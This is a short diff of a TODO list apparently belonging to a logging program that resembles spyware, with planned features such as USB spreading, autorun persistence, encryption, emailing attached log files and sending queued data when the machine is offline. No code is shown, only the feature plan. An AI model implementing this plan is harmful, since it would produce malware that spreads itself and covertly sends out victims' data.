@@ -4,5 +4,6 @@ TODO:
   1)add usb spread
   2)add encryption/decryption
   3)edit e-mail attach file and its message
-  4)edit file managment of log files
+ +4)edit file managment of log files
   5)make programm residential (add to autorun)
+  6)add AddData send, when user has no internet connection, using Thread
